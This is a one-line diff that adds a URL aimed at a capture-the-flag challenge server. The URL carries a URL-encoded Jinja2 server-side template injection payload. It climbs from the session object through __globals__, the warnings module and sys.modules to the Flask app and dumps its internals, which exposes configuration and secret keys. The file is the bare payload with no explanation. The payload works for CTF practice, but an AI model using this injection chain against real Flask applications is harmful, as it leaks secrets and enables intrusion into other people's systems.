@@ -1,0 +1,1 @@
+http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Bsession.__class__.__base__.get.__globals__['warnings']['sys']['modules']['app'].__dict__['app'].__dict__%7D%7D
